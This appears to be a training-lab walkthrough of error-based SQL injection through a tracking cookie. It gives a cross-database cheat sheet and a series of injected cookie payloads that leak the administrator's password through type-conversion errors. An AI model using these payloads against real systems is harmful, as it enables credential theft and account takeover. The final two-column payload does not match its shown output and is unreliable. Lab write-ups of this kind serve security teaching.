# Description
This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called `users`, with columns called `username` and `password`. To solve the lab, find a way to leak the password for the `administrator` user, then log in to their account.
# Solution
## Cheatsheet

You can potentially elicit error messages that leak sensitive data returned by your malicious query.

| DB         | Description                                                                                                                 |
| ---------- | --------------------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `SELECT 'foo' WHERE 1 = (SELECT 'secret') > Conversion failed when converting the varchar value 'secret' to data type int.` |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int) > invalid input syntax for integer: "secret"`                     |
| MySQL      | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) > XPATH syntax error: '\secret'`               |

1) **Test if the SQL injection vulnerability exists:**
```
Cookie: TrackingId=Nd2ctiZQt4mwEuku'
```
=> 500 internal server error.

```
Cookie: TrackingId=Nd2ctiZQt4mwEuku'--
```
Or:
```
Cookie: TrackingId=Nd2ctiZQt4mwEuku''
```
=> 200 response code.
**-> SQL injection vulnerability exists**.

2) **Verify whether error-based SQL injection is visible:**
```
' AND CAST((SELECT 1) AS int)--
```

```
ERROR: argument of AND must be type boolean, not type integer
Position: 63
```
=> 500 internal server error.
-> Cause it returns `' AND 1` (error) => we must change to **boolean type** (True, False).

```
' AND 1=CAST((SELECT 1) AS int)--
```
=> 200 response code as we give correct type.

3) **Determine the existence of** `administrator` **user:**
```
' AND 1=CAST((SELECT username FROM users) AS int)--
```
=> 500 internal server error.
```
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'nTiQUSaeDU2zGKXX' AND 1=CAST((SELECT username FROM users LIM'.Expected char
```
-> The return reports that the query is **truncated**, meaning the length exceeds the limit.

Test again with shorter length by reducing the cookie.
```
Cookie: TrackingId=zEY' AND 1=CAST((SELECT username FROM users) AS int)--
```
=> 500 internal server error.
```
ERROR: more than one row returned by a subquery used as an expression
```
->  More than one row returned -> Use `LIMIT` to reduce to 1.

```
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

```
ERROR: invalid input syntax for type integer: "administrator"
```
=>  The all entries of `username` field is in string format -> changing format to integer will return error.
=> The visible report have shown the existing user - `administrator` as cannot change its type.

4) Leak the password of admin user:
```
Cookie: TrackingId=' AND 1=CAST((SELECT username,password FROM users LIMIT 1) AS int)--
```

```
ERROR: invalid input syntax for type integer: "h7ydwsapv24sxfxeomrd"
```

=> Same to `username` field, cannot change the type of entries in `password` field.